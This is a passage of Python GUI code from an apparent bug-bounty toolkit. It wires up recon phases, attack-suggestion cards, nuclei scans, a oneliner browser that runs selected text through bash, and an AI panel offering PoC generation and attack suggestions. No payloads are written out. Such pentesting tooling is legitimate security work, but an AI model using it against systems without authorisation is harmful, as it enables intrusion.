        self._sr_term.log(f"[*] {len(steps)} phases to execute", 'info')
        def _run_all():
            import subprocess as sp
            for label, cmd, desc in steps:
                self._sr_term.log(f"\n[>>>] {label} — {desc}", 'info')
                try:
                    proc = sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT, text=True)
                    for line in proc.stdout: self._sr_term.log(strip_ansi(line.rstrip()))
                    proc.wait()
                    self._sr_term.log(f"[✓] {label} done", 'ok')
                except Exception as e:
                    self._sr_term.log(f"[!] {label}: {e}", 'err')
            self._sr_term.log("\n[✓] SMART RECON COMPLETE", 'ok')
            self.root.after(500, lambda: self._refresh_attack_suggestions(target, proj))
        threading.Thread(target=_run_all, daemon=True).start()

    def _build_attack_suggestions(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "AI-POWERED ATTACK SUGGESTIONS", "🎯").pack(fill='x', pady=(0,10))
        hr = mk_frame(pad, bg=BG2); hr.pack(fill='x', pady=(0,10))
        mk_btn(hr, "🔄 Refresh Suggestions", lambda: self._refresh_attack_suggestions(
            self._sr_target.get(), self.project.get()), YELLOW, small=True).pack(side='left', padx=4)
        mk_btn(hr, "🤖 Get AI Analysis", lambda: self._ai_analyze_surface(), PURPLE, small=True).pack(side='left', padx=4)
        self._sr_suggestions_canvas = tk.Canvas(pad, bg=BG2, highlightthickness=0)
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._sr_suggestions_canvas.yview)
        self._sr_suggestions_canvas.configure(yscrollcommand=vsb.set)
        vsb.pack(side='right', fill='y')
        self._sr_suggestions_canvas.pack(fill='both', expand=True)
        self._sr_suggestions_inner = mk_frame(self._sr_suggestions_canvas, bg=BG2)
        cw = self._sr_suggestions_canvas.create_window((0,0), window=self._sr_suggestions_inner, anchor='nw')
        self._sr_suggestions_inner.bind("<Configure>",
            lambda e: self._sr_suggestions_canvas.configure(scrollregion=self._sr_suggestions_canvas.bbox('all')))
        self._sr_suggestions_canvas.bind("<Configure>",
            lambda e: self._sr_suggestions_canvas.itemconfig(cw, width=e.width))
        tk.Label(self._sr_suggestions_inner, text="Run Smart Recon first to see attack suggestions.",
                 bg=BG2, fg=FG3, font=MONO_S).pack(pady=20)

    def _refresh_attack_suggestions(self, target: str, project: str):
        """Parse tech files and build intelligent attack suggestion cards."""
        for w in self._sr_suggestions_inner.winfo_children(): w.destroy()
        summary = smart_recon.get_attack_surface_summary(project, target)
        tech_files = summary.get("tech_files", {})
        if not tech_files:
            tk.Label(self._sr_suggestions_inner, text="No tech files found. Run httpx probe first.",
                     bg=BG2, fg=FG3, font=MONO_S).pack(pady=20)
            return
        suggestions = smart_recon.analyze_tech_for_attacks(tech_files)
        if not suggestions:
            tk.Label(self._sr_suggestions_inner, text="No specific tech detected. Check logs.",
                     bg=BG2, fg=FG3, font=MONO_S).pack(pady=20)
            return

        for s in suggestions:
            sev_colors = {"CRITICAL": RED, "HIGH": YELLOW, "MEDIUM": CYAN, "LOW": GREEN}
            sev_clr = sev_colors.get(s["severity"], FG2)
            card = mk_card(self._sr_suggestions_inner)
            card.pack(fill='x', padx=4, pady=6)
            cf = mk_frame(card, bg=BG3); cf.pack(fill='x', padx=12, pady=10)
            # Header
            hf = mk_frame(cf, bg=BG3); hf.pack(fill='x', pady=(0,6))
            tk.Label(hf, text=f"⚡ {s['tech']}", bg=BG3, fg=sev_clr, font=('Consolas',12,'bold')).pack(side='left')
            tk.Label(hf, text=f" [{s['severity']}]", bg=BG3, fg=sev_clr, font=MONO_B).pack(side='left')
            tk.Label(hf, text=f"  {s['host_count']} hosts", bg=BG3, fg=FG3, font=MONO_S).pack(side='left', padx=8)
            # Attacks
            tk.Label(cf, text="Recommended Attacks:", bg=BG3, fg=FG2, font=MONO_B).pack(anchor='w', pady=(0,4))
            for atk in s["attacks"]:
                tk.Label(cf, text=f"  ▸ {atk}", bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w')
            # Oneliners
            if s.get("oneliners"):
                tk.Label(cf, text="\nQuick Commands:", bg=BG3, fg=ACCENT, font=MONO_B).pack(anchor='w', pady=(6,4))
                for ol in s["oneliners"][:3]:
                    txt = scrolledtext.ScrolledText(cf, height=2, bg=BG4, fg=GREEN, font=(_MONO_FACE,8), wrap='none', state='normal')
                    txt.insert('end', ol); txt.config(state='disabled')
                    txt.pack(fill='x', pady=2)
            # Buttons
            bf2 = mk_frame(cf, bg=BG3); bf2.pack(fill='x', pady=(8,0))
            _tech = s["tech"].lower(); _hosts = s["hosts"]
            mk_btn(bf2, f"▶ Run Nuclei on {s['tech']}",
                   lambda t=_tech, h=_hosts: self._run_tech_nuclei(t, h), GREEN, small=True).pack(side='left', padx=4)
            mk_btn(bf2, "📋 Copy Hosts",
                   lambda h=_hosts: (self.root.clipboard_clear(), self.root.clipboard_append("\n".join(h))), FG2, small=True).pack(side='left', padx=4)

    def _run_tech_nuclei(self, tech: str, hosts: list):
        if not hosts: return
        import tempfile
        tmp = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
        tmp.write("\n".join(hosts)); tmp.close()
        cmd = ["nuclei", "-l", tmp.name, "-t", f"technologies/{tech}/",
               "-t", f"vulnerabilities/{tech}/", "-severity", "high,critical", "-silent"]
        if hasattr(self, '_sr_term'): self._sr_term.run_command(cmd, label=f"Nuclei {tech.upper()}")

    def _ai_analyze_surface(self):
        target = self._sr_target.get() or "TARGET"
        proj   = self.project.get() or "default"
        summary = smart_recon.get_attack_surface_summary(proj, target)
        summary_text = json.dumps(summary, indent=2)
        self._goto_tab("AI Assistant")
        self._ai_input_var.set(f"Target: {target}\n\nRecon Summary:\n{summary_text}")
        self._ai_run_feature("🎯 Smart Attack Suggestions")

    def _build_surface_summary(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "ATTACK SURFACE SUMMARY", "📊").pack(fill='x', pady=(0,10))
        hr = mk_frame(pad, bg=BG2); hr.pack(fill='x', pady=(0,12))
        mk_btn(hr, "🔄 Refresh", lambda: self._load_surface_summary(), FG2, small=True).pack(side='left', padx=4)
        mk_btn(hr, "💾 Export JSON", lambda: self._export_surface_json(), GREEN, small=True).pack(side='left', padx=4)
        self._surface_txt = mk_stext(pad, h=30, bg=BG3, fg=FG)
        self._surface_txt.pack(fill='both', expand=True)
        self._load_surface_summary()

    def _load_surface_summary(self):
        target = self._sr_target.get() if hasattr(self, '_sr_target') else self.project.get()
        proj   = self.project.get() or "default"
        if not target: return
        summary = smart_recon.get_attack_surface_summary(proj, target)
        self._surface_txt.config(state='normal'); self._surface_txt.delete('1.0', 'end')
        self._surface_txt.insert('end', f"TARGET: {target}\n")
        self._surface_txt.insert('end', f"{'═'*50}\n\n")
        for k, v in summary.items():
            if k not in ('tech_files', 'tech_breakdown'):
                self._surface_txt.insert('end', f"  {k:<20}: {v}\n")
        if summary.get('tech_breakdown'):
            self._surface_txt.insert('end', f"\n  TECH BREAKDOWN:\n")
            for tech, count in summary['tech_breakdown'].items():
                self._surface_txt.insert('end', f"  {'  '+tech:<22}: {count} hosts\n")
        self._surface_txt.config(state='disabled')

    def _export_surface_json(self):
        target = self._sr_target.get() if hasattr(self, '_sr_target') else ""
        proj   = self.project.get() or "default"
        summary = smart_recon.get_attack_surface_summary(proj, target)
        path = filedialog.asksaveasfilename(defaultextension='.json', filetypes=[('JSON','*.json')])
        if path:
            with open(path, 'w') as f: json.dump(summary, f, indent=2)
            self.set_status(f"Surface exported: {path}", GREEN)

    # ═════════════════════════════════════════════════════════════
    #  ONELINERS TAB
    # ═════════════════════════════════════════════════════════════
    def _build_oneliners(self, frame):
        frame.configure(bg=BG2)
        # AI Assistant now has main panel + bonus tabs
        ai_nb = ttk.Notebook(frame); ai_nb.pack(fill='both', expand=True)
        ai_main = tk.Frame(ai_nb, bg=BG2); ai_nb.add(ai_main, text="  🧠 Features  ")
        ai_poc  = tk.Frame(ai_nb, bg=BG2); ai_nb.add(ai_poc,  text="  💥 Auto-PoC  ")
        ai_chain= tk.Frame(ai_nb, bg=BG2); ai_nb.add(ai_chain, text="  🔗 Vuln Chains  ")
        ai_bounty=tk.Frame(ai_nb, bg=BG2); ai_nb.add(ai_bounty,text="  💰 Bounty Est.  ")
        self._build_ai_autopoc(ai_poc)
        self._build_ai_chains(ai_chain)
        self._build_ai_bounty(ai_bounty)
        frame = ai_main  # redirect rest of _build_ai_assistant to main tab
        paned = tk.PanedWindow(frame, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True)

        # Left: category + sub-category tree
        left = mk_frame(paned, bg=BG2); paned.add(left, width=240)
        tk.Label(left, text="CATEGORIES", bg=BG2, fg=ACCENT, font=MONO_B).pack(pady=(10,4), padx=10, anchor='w')
        cat_tree = mk_tree(left, columns=(), show='tree', height=38)
        vsb_c = ttk.Scrollbar(left, orient='vertical', command=cat_tree.yview)
        cat_tree.configure(yscrollcommand=vsb_c.set)
        cat_tree.pack(side='left', fill='both', expand=True, padx=(10,0))
        vsb_c.pack(side='right', fill='y')
        cat_tree.tag_configure('cat', foreground=ACCENT, background=BG3)
        cat_tree.tag_configure('sub', foreground=FG2, background=BG3)
        # Populate tree
        for cat_name, subcats in oneliners_module.ALL_ONELINER_CATEGORIES.items():
            cat_iid = cat_tree.insert('', 'end', text=cat_name, tags=('cat',))
            for subcat in subcats:
                cat_tree.insert(cat_iid, 'end', text=subcat, iid=f"{cat_name}||{subcat}", tags=('sub',))

        # Right: display + controls
        right = mk_frame(paned, bg=BG2); paned.add(right, stretch='always')
        top_r = mk_frame(right, bg=BG2); top_r.pack(fill='x', padx=10, pady=8)
        tk.Label(top_r, text="TARGET:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._ol_target = tk.StringVar(value=self.project.get() or "{target}")
        mk_entry(top_r, var=self._ol_target, w=30).pack(side='left', padx=8, ipady=3)
        mk_btn(top_r, "← Project", lambda: self._ol_target.set(self.project.get()), FG3, small=True).pack(side='left')
        self._ol_count_lbl = tk.Label(top_r, text=f"Total: {oneliners_module.count_oneliners()} oneliners",
                                       bg=BG2, fg=FG3, font=MONO_S)
        self._ol_count_lbl.pack(side='right', padx=8)

        # Oneliner text display
        self._ol_txt = mk_stext(right, h=32)
        self._ol_txt.pack(fill='both', expand=True, padx=10, pady=(0,8))
        self._ol_txt.tag_config('cmd',     foreground=GREEN)
        self._ol_txt.tag_config('comment', foreground=FG3)
        self._ol_txt.tag_config('header',  foreground=ACCENT)

        # Buttons
        bf = mk_frame(right, bg=BG2); bf.pack(fill='x', padx=10, pady=(0,10))
        def copy_visible():
            self.root.clipboard_clear()
            self.root.clipboard_append(self._ol_txt.get('1.0', 'end'))
            self.set_status(f"Oneliners copied!", GREEN)
        def save_visible(): self._save_text(self._ol_txt.get('1.0', 'end'))
        def run_selected():
            # Get selected text
            try:
                sel = self._ol_txt.get(tk.SEL_FIRST, tk.SEL_LAST).strip()
                if sel and not sel.startswith('#'):
                    if hasattr(self, 'recon_term') and self.recon_term:
                        self.recon_term.run_command(["bash", "-c", sel], label="Oneliner")
                        self._goto_tab("Auto-Recon")
            except tk.TclError:
                messagebox.showinfo("Tip", "Select a oneliner line first, then click Run.", parent=self.root)
        mk_btn(bf, "📋 Copy All", copy_visible, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save",     save_visible, FG2,   small=True).pack(side='left', padx=4)
        mk_btn(bf, "▶ Run Selected (in Recon Terminal)", run_selected, GREEN, small=True).pack(side='left', padx=4)

        def on_select(event):
            sel = cat_tree.selection()
            if not sel: return
            iid = sel[0]
            target = self._ol_target.get() or "{target}"
            self._ol_txt.config(state='normal'); self._ol_txt.delete('1.0', 'end')
            if "||" in iid:
                cat_name, subcat = iid.split("||", 1)
                items = oneliners_module.ALL_ONELINER_CATEGORIES.get(cat_name, {}).get(subcat, [])
                self._ol_txt.insert('end', f"# {cat_name} → {subcat}\n", 'header')
                self._ol_txt.insert('end', f"# Target: {target}\n\n", 'comment')
                for ol in items:
                    line = ol.replace("{target}", target)
                    tag = 'comment' if line.strip().startswith('#') else 'cmd'
                    self._ol_txt.insert('end', line + "\n\n", tag)
            else:
                cat_name = iid
                cat_data = oneliners_module.ALL_ONELINER_CATEGORIES.get(cat_name, {})
                self._ol_txt.insert('end', f"# {cat_name}\n# Target: {target}\n\n", 'header')
                for subcat, items in cat_data.items():
                    self._ol_txt.insert('end', f"# ── {subcat} ──\n", 'comment')
                    for ol in items:
                        line = ol.replace("{target}", target)
                        tag = 'comment' if line.strip().startswith('#') else 'cmd'
                        self._ol_txt.insert('end', line + "\n\n", tag)
            self._ol_txt.config(state='disabled')

        cat_tree.bind("<<TreeviewSelect>>", on_select)
        self._ol_target.trace_add('write', lambda *_: on_select(None) if cat_tree.selection() else None)
        # Auto-expand first category
        first = list(cat_tree.get_children())[0] if cat_tree.get_children() else None
        if first: cat_tree.item(first, open=True); cat_tree.selection_set(first); on_select(None)

    # ═════════════════════════════════════════════════════════════
    #  AI ASSISTANT — 100 Features
    # ═════════════════════════════════════════════════════════════
    def _build_ai_assistant(self, frame):
        frame.configure(bg=BG2)
        paned = tk.PanedWindow(frame, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True)

        # Left sidebar: feature list
        left = mk_frame(paned, bg=BG2); paned.add(left, width=260)
        tk.Frame(left, bg=ACCENT, height=2).pack(fill='x')
        tk.Label(left, text="⚡ AI FEATURES", bg=BG2, fg=ACCENT, font=MONO_B).pack(pady=(8,4), padx=10, anchor='w')
        tk.Label(left, text=f"{len([f for f in ai_assistant.AI_FEATURES.values() if isinstance(f,dict)])} features",
                 bg=BG2, fg=FG3, font=MONO_S).pack(padx=10, anchor='w', pady=(0,6))

        # Search
        sv = tk.StringVar()
        se = mk_entry(left, var=sv, w=28); se.pack(padx=10, pady=(0,6), ipady=3)
        tk.Label(left, text="🔍 Search features...", bg=BG2, fg=FG3, font=('Consolas',7)).pack(padx=10, anchor='w')

        feat_tree = mk_tree(left, columns=(), show='tree', height=38)
        vsb_f = ttk.Scrollbar(left, orient='vertical', command=feat_tree.yview)
        feat_tree.configure(yscrollcommand=vsb_f.set)
        feat_tree.pack(side='left', fill='both', expand=True, padx=(10,0), pady=(4,0))
        vsb_f.pack(side='right', fill='y')
        feat_tree.tag_configure('cat',  foreground=ACCENT, background=BG3)
        feat_tree.tag_configure('feat', foreground=FG2, background=BG3)
        feat_tree.tag_configure('hot',  foreground=GREEN, background=BG3)

        HOT_FEATURES = {"💣 Generate PoC Code", "📝 Write Full Bug Report", "🎯 Smart Attack Suggestions",
                        "📜 Bash Oneliner Generator", "✨ Improve Report Quality", "💬 Ask Anything Security"}

        def populate_feat_tree(search: str = ""):
            feat_tree.delete(*feat_tree.get_children())
            cats = ai_assistant.get_feature_categories()
            for cat, feats in cats.items():
                matched = [f for f in feats if not search or search.lower() in f.lower()]
                if not matched: continue
                cat_iid = feat_tree.insert('', 'end', text=f"▸ {cat}", tags=('cat',))
                for feat_name in matched:
                    tag = 'hot' if feat_name in HOT_FEATURES else 'feat'
                    feat_tree.insert(cat_iid, 'end', text=feat_name, iid=feat_name, tags=(tag,))

        populate_feat_tree()
        sv.trace_add('write', lambda *_: populate_feat_tree(sv.get()))

        # Right: main panel
        right = mk_frame(paned, bg=BG2); paned.add(right, stretch='always')
        tk.Frame(right, bg=ACCENT, height=2).pack(fill='x')

        # Feature header
        self._ai_feat_lbl = tk.Label(right, text="Select a feature from the left panel",
                                      bg=BG2, fg=ACCENT, font=MONO_H)
        self._ai_feat_lbl.pack(pady=(10,4), padx=14, anchor='w')
        self._ai_feat_desc = tk.Label(right, text="",
                                       bg=BG2, fg=FG3, font=MONO_S, wraplength=700, anchor='w')
        self._ai_feat_desc.pack(padx=14, anchor='w', pady=(0,8))

        # API key row
        api_row = mk_card(right); api_row.pack(fill='x', padx=14, pady=(0,8))
        arf = mk_frame(api_row, bg=BG3); arf.pack(fill='x', padx=12, pady=8)
        tk.Label(arf, text="API KEY:", bg=BG3, fg=FG3, font=MONO_S).pack(side='left')
        ai_key_entry = mk_entry(arf, var=self._ai_api_key, w=48, show='●')
        ai_key_entry.pack(side='left', padx=8, ipady=3)
        mk_btn(arf, "👁 Show", lambda: ai_key_entry.config(show='' if ai_key_entry['show'] else '●'),
               FG3, small=True).pack(side='left')
        def save_ai_key():
            cfg = load_cfg(); cfg["api_keys"]["anthropic_api_key"] = self._ai_api_key.get()
            save_cfg(cfg); self.set_status("AI API key saved!", GREEN)
        mk_btn(arf, "💾 Save", save_ai_key, GREEN, small=True).pack(side='left', padx=8)
        # Load saved key
        try:
            saved_key = load_cfg().get("api_keys", {}).get("anthropic_api_key", "")
            if saved_key: self._ai_api_key.set(saved_key)
        except Exception: pass

        # Input area
        self._ai_input_lbl = tk.Label(right, text="Input:", bg=BG2, fg=FG2, font=MONO_B)
        self._ai_input_lbl.pack(padx=14, anchor='w', pady=(0,4))
        self._ai_input_frame = mk_frame(right, bg=BG2); self._ai_input_frame.pack(fill='x', padx=14, pady=(0,4))
        self._ai_input_var = tk.StringVar()
        self._ai_input_entry = mk_entry(self._ai_input_frame, var=self._ai_input_var, w=80)
        self._ai_input_entry.pack(side='left', padx=(0,8), ipady=3, fill='x', expand=True)
        # Extra fields dict
        self._ai_extra_vars = {}

        # Multi-line input
        self._ai_txt_input = mk_stext(right, h=8, bg=BG3, fg=FG)
        self._ai_txt_input.pack(fill='x', padx=14, pady=(0,8))

        # Run button
        run_row = mk_frame(right, bg=BG2); run_row.pack(fill='x', padx=14, pady=(0,6))
        # Provider selector
        tk.Label(run_row, text="AI:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(0,4))
        self._ai_provider = tk.StringVar(value="claude")
        for prov, lbl, clr in [("claude","🤖 Claude",ACCENT),("gemini","✨ Gemini Flash",CYAN),("gemini-pro","⚡ Gemini Pro",GREEN)]:
            ttk.Radiobutton(run_row, text=lbl, variable=self._ai_provider, value=prov).pack(side='left', padx=4)
        tk.Frame(run_row, bg=BORDER2, width=1).pack(side='left', fill='y', padx=8, pady=4)
        self._ai_run_btn = mk_btn(run_row, "▶ Run Feature", self._ai_run_current, PURPLE)
        self._ai_run_btn.pack(side='left', ipady=6, padx=(0,8))
        self._ai_stop_btn = mk_btn(run_row, "⬛ Stop", lambda: None, RED, small=True)
        self._ai_stop_btn.pack(side='left', padx=4)
        self._ai_status_lbl = tk.Label(run_row, text="Ready", bg=BG2, fg=FG3, font=MONO_S)
        self._ai_status_lbl.pack(side='left', padx=12)
        mk_btn(run_row, "📋 Copy Response", lambda: (
            self.root.clipboard_clear(),
            self.root.clipboard_append(self._ai_response_txt.get('1.0', 'end'))), ACCENT, small=True).pack(side='right', padx=4)
        mk_btn(run_row, "🗑 Clear", lambda: (
            self._ai_response_txt.config(state='normal'),
            self._ai_response_txt.delete('1.0','end'),
            self._ai_response_txt.config(state='disabled')), FG3, small=True).pack(side='right', padx=4)
        mk_btn(run_row, "💾 Save", lambda: self._save_text(self._ai_response_txt.get('1.0','end')), FG2, small=True).pack(side='right', padx=4)

        # Response area
        tk.Label(right, text="AI Response:", bg=BG2, fg=FG2, font=MONO_B).pack(padx=14, anchor='w', pady=(0,4))
        self._ai_response_txt = mk_stext(right, h=20, bg=BG3, fg=FG)
        self._ai_response_txt.pack(fill='both', expand=True, padx=14, pady=(0,10))
        self._ai_response_txt.tag_config('thinking', foreground=FG3)
        self._ai_response_txt.tag_config('error',    foreground=RED)
        self._ai_response_txt.tag_config('code',     foreground=GREEN)

        self._current_ai_feature = None

        def on_feat_select(event):
            sel = feat_tree.selection()
            if not sel: return
            feat_name = sel[0]
            feat = ai_assistant.AI_FEATURES.get(feat_name)
            if not feat or not isinstance(feat, dict): return
            self._current_ai_feature = feat_name
            self._ai_feat_lbl.config(text=feat_name)
            self._ai_feat_desc.config(text=feat.get("prompt_template","")[:120] + "...")
            self._ai_input_lbl.config(text=feat.get("input_label","Input:"))
            # Clear extra fields
            for w in self._ai_input_frame.winfo_children(): w.destroy()
            self._ai_extra_vars.clear()
            # Main input
            self._ai_input_var = tk.StringVar()
            self._ai_input_entry = mk_entry(self._ai_input_frame, var=self._ai_input_var, w=70)
            self._ai_input_entry.pack(side='left', padx=(0,8), ipady=3, fill='x', expand=True)
            # Extra fields if any
            if "extra_fields" in feat:
                for field_key, field_label in feat["extra_fields"].items():
                    var = tk.StringVar()
                    self._ai_extra_vars[field_key] = var
                    ef_row = mk_frame(right, bg=BG2); ef_row.pack(fill='x', padx=14, pady=2)
                    tk.Label(ef_row, text=field_label+":", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
                    mk_entry(ef_row, var=var, w=40).pack(side='left', padx=8, ipady=3)

        feat_tree.bind("<<TreeviewSelect>>", on_feat_select)

    def _ai_run_current(self):
        if not self._current_ai_feature:
            messagebox.showwarning("No Feature","Select a feature from the left panel.", parent=self.root); return
        self._ai_run_feature(self._current_ai_feature)

    def _ai_run_feature(self, feat_name: str):
        # Get input — try multiline text first, then single line
        ml_input = self._ai_txt_input.get('1.0', 'end').strip() if hasattr(self, '_ai_txt_input') else ""
        sl_input = self._ai_input_var.get().strip() if hasattr(self, '_ai_input_var') else ""
        user_input = ml_input or sl_input
        if not user_input:
            messagebox.showwarning("No Input","Enter your input first.", parent=self.root); return

        extra = {}
        for k, v in self._ai_extra_vars.items():
            extra[k] = v.get()

        api_key = self._ai_api_key.get().strip() if hasattr(self, '_ai_api_key') else ""

        self._ai_status_lbl.config(text="⏳ Thinking...", fg=YELLOW)
        self._ai_response_txt.config(state='normal')
        self._ai_response_txt.delete('1.0', 'end')
        self._ai_response_txt.insert('end', f"[*] Running: {feat_name}\n[*] Please wait...\n\n", 'thinking')
        self._ai_response_txt.config(state='disabled')

        provider = self._ai_provider.get() if hasattr(self, "_ai_provider") else "claude"
        # Use correct API key for provider
        if provider.startswith("gemini"):
            api_key = api_key or (load_cfg().get("api_keys",{}).get("gemini_api_key",""))
        else:
            api_key = api_key or (load_cfg().get("api_keys",{}).get("anthropic_api_key",""))

        def _call():
            response = ai_assistant.run_feature_with_provider(feat_name, user_input, extra, api_key, provider)
            self._ai_response_txt.config(state='normal')
            self._ai_response_txt.delete('1.0', 'end')
            if response.startswith("❌"):
                self._ai_response_txt.insert('end', response, 'error')
            else:
                self._ai_response_txt.insert('end', response)
            self._ai_response_txt.config(state='disabled')
            self._ai_status_lbl.config(text="✓ Done", fg=GREEN)

        threading.Thread(target=_call, daemon=True).start()



    # ═════════════════════════════════════════════════════════════
    #  ANALYSIS TAB — JS Analyzer | Endpoint Extractor | Code Vuln | CVE Finder
    # ═════════════════════════════════════════════════════════════

    # ═══════════════════════════════════════════════════════════════
    #  ANALYSIS TAB — JS Analyzer | Endpoint Extractor | Code Vuln | CVE
    # ═══════════════════════════════════════════════════════════════
    def _build_analysis(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        js_f  = tk.Frame(nb2, bg=BG2); nb2.add(js_f,  text="  🔍 JS Analyzer  ")
        ep_f  = tk.Frame(nb2, bg=BG2); nb2.add(ep_f,  text="  🔗 Endpoints  ")
        cv_f  = tk.Frame(nb2, bg=BG2); nb2.add(cv_f,  text="  🐛 Code Vulns  ")
        cve_f = tk.Frame(nb2, bg=BG2); nb2.add(cve_f, text="  🛡 CVE Finder  ")
        self._build_js_analyzer(js_f)
        self._build_endpoint_extractor(ep_f)
        self._build_code_vuln_finder(cv_f)
        self._build_cve_finder(cve_f)

    # ── JS ANALYZER ──────────────────────────────────────────────────
    def _build_js_analyzer(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "JAVASCRIPT SECURITY ANALYZER", "🔍").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text="  Detects secrets, tokens, dangerous functions, endpoints from JS code/URL/file",
                 bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=10, pady=6)

        ir = mk_frame(pad, bg=BG2); ir.pack(fill='x', pady=(0,8))
        self._js_url_var = tk.StringVar()
        tk.Label(ir, text="JS URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        mk_entry(ir, var=self._js_url_var, w=50).pack(side='left', padx=8, ipady=3)
        mk_btn(ir, "🌐 Fetch URL",  self._js_analyze_url,    ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(ir, "📂 Open File",  self._js_analyze_file,   CYAN,   small=True).pack(side='left', padx=4)

        paned = tk.PanedWindow(pad, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True, pady=(4,0))

        left = mk_frame(paned, bg=BG2); paned.add(left, width=420)
        tk.Label(left, text="Paste JS Code:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,3))
        self._js_code_txt = mk_stext(left, h=22, bg=BG3, fg='#8be9fd')
        self._js_code_txt.pack(fill='both', expand=True)
        bf_l = mk_frame(left, bg=BG2); bf_l.pack(fill='x', pady=(5,0))
        mk_btn(bf_l, "▶ Analyze Code", self._js_analyze_pasted, GREEN,  small=True).pack(side='left', padx=4)
        mk_btn(bf_l, "🗑 Clear",       lambda: self._js_code_txt.delete('1.0','end'), FG3, small=True).pack(side='left', padx=4)

        right = mk_frame(paned, bg=BG2); paned.add(right, stretch='always')
        tk.Label(right, text="Findings:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,3))

        cols = ('Type','Severity','Line','Value / Context')
        self._js_tree = mk_tree(right, columns=cols, show='headings', height=14)
        for c,w in zip(cols,(160,70,50,360)):
            self._js_tree.heading(c,text=c); self._js_tree.column(c,width=w)
        for sev in ('CRITICAL','HIGH','MEDIUM','LOW'):
            self._js_tree.tag_configure(sev, foreground=SEV_COLOR(sev), background=SEV_BG(sev))
        vsb = ttk.Scrollbar(right, orient='vertical', command=self._js_tree.yview)
        self._js_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(right, bg=BG2); tf.pack(fill='x')
        self._js_tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)
        self._js_tree.bind('<Double-1>', self._js_detail)

        self._js_summary_lbl = tk.Label(right, text="Run analysis to see results",
                                         bg=BG2, fg=FG3, font=MONO_S)
        self._js_summary_lbl.pack(anchor='w', pady=(5,3))
        self._js_detail_txt = mk_stext(right, h=8, bg=BG3, fg=FG)
        self._js_detail_txt.pack(fill='x', pady=(0,4))

        bf_r = mk_frame(right, bg=BG2); bf_r.pack(fill='x')
        mk_btn(bf_r, "📋 Copy Secrets",  self._js_copy_secrets,   RED,   small=True).pack(side='left', padx=4)
        mk_btn(bf_r, "💾 Export JSON",   self._js_export_json,    GREEN, small=True).pack(side='left', padx=4)
        mk_btn(bf_r, "🔗 Endpoints",     self._js_show_endpoints, CYAN,  small=True).pack(side='left', padx=4)
        self._js_results = None

    def _js_run_analysis(self, code, filename="pasted"):
        if not code.strip():
            messagebox.showwarning("Empty", "No JavaScript code to analyze.", parent=self.root); return
        self._js_results = sec_tools.analyze_js(code, filename)
        r = self._js_results
        self._js_tree.delete(*self._js_tree.get_children())

        # Secrets
        for s in r.get("secrets", []):
            sev = str(s.get("severity","HIGH")).upper()
            self._js_tree.insert('','end',
                values=(f"🔑 {s['type']}", sev, s.get("line","?"), s.get("value","")[:80]),
                tags=(sev,))
        # Dangerous functions
        for d in r.get("dangerous_functions", []):
            sev = str(d.get("severity","MEDIUM")).upper()
            self._js_tree.insert('','end',
                values=(f"⚡ {d['function']}", sev, d.get("line","?"), d.get("context","")[:80]),
                tags=(sev,))
        # Interesting comments
        for c2 in r.get("comments", []):
            self._js_tree.insert('','end',
                values=("💬 Comment", "MEDIUM", c2.get("line","?"), c2.get("text","")[:80]),
                tags=("MEDIUM",))
        # Endpoints (show top 20)
        for ep in r.get("endpoints", [])[:20]:
            self._js_tree.insert('','end',
                values=("🔗 Endpoint", "INFO", "—", ep[:80]),
                tags=("LOW",))

        s2 = r.get("summary", {})
        total_findings = (s2.get('secrets_found',0) + s2.get('dangerous_calls',0) +
                          s2.get('interesting_comments',0))
        if total_findings == 0:
            summary_txt = (f"✅ No secrets/dangerous calls found  |  "
                           f"Endpoints: {s2.get('endpoints_found',0)}  |  "
                           f"Lines: {r.get('lines',0)}  |  "
                           f"File: {filename}")
            self._js_summary_lbl.config(text=summary_txt, fg=GREEN)
        else:
            summary_txt = (f"⚠ Risk: {s2.get('risk','LOW')}  |  "
                           f"Secrets: {s2.get('secrets_found',0)}  |  "
                           f"Dangerous: {s2.get('dangerous_calls',0)}  |  "
                           f"Endpoints: {s2.get('endpoints_found',0)}  |  "
                           f"Comments: {s2.get('interesting_comments',0)}")
            self._js_summary_lbl.config(text=summary_txt, fg=SEV_COLOR(s2.get("risk","LOW")))
        self.set_status(
            f"JS analysis: {s2.get('secrets_found',0)} secrets, "
            f"{s2.get('dangerous_calls',0)} dangerous, "
            f"{s2.get('endpoints_found',0)} endpoints",
            RED if s2.get("secrets_found",0) > 0 else GREEN)

    def _js_analyze_pasted(self):
        code = self._js_code_txt.get('1.0','end').strip()
        if not code:
            messagebox.showwarning("Empty","Paste JS code first.", parent=self.root); return
        self._js_run_analysis(code, "pasted_code.js")

    def _js_analyze_url(self):
        url = self._js_url_var.get().strip()
        if not url: return
        if not url.startswith('http'):
            url = 'https://' + url
        self.set_status('Fetching ' + url + '...', CYAN)
        def _go():
            try:
                import urllib.request as _ur
                req = _ur.Request(url, headers={'User-Agent':'Mozilla/5.0'})
                with _ur.urlopen(req, timeout=15) as resp:
